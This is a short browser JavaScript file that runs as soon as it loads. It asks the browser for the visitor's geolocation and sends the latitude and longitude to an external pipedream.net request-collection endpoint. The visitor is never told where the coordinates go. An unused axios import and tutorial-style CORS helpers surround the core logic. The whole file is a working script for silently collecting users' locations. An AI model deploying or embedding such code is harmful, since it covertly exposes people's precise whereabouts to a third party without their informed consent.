import axios from "axios";

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    alert("Geolocation is not supported by this browser.");
  }
}

function createCORSRequest(method, url) {
  var xhr = new XMLHttpRequest();
  if ("withCredentials" in xhr) {
    // Check if the XMLHttpRequest object has a "withCredentials" property.
    // "withCredentials" only exists on XMLHTTPRequest2 objects.
    xhr.open(method, url, true);
  } else if (typeof XDomainRequest != "undefined") {
    // Otherwise, check if XDomainRequest.
    // XDomainRequest only exists in IE, and is IE's way of making CORS requests.
    xhr = new XDomainRequest();
    xhr.open(method, url);
  } else {
    // Otherwise, CORS is not supported by the browser.
    xhr = null;
  }
  return xhr;
}

function makeCorsRequest(api) {
  // This is a sample server that supports CORS.
  var url = api;

  var xhr = createCORSRequest("POST", url);
  if (!xhr) {
    alert("CORS not supported");
    return;
  }

  // // Response handlers.
  // xhr.onload = function () {
  //   var text = xhr.responseText;
  //   var title = getTitle(text);
  //   alert("Response from CORS request to " + url + ": " + title);
  // };

  // xhr.onerror = function () {
  //   alert("Woops, there was an error making the request.");
  // };

  xhr.send();
}

const showPosition = (position) => {
  const api = `https://enldy364x3eb.x.pipedream.net?c=${position.coords.latitude}, ${position.coords.longitude}`;
  console.log(`${position.coords.latitude}, ${position.coords.longitude}`);
  makeCorsRequest(api);
};

getLocation();
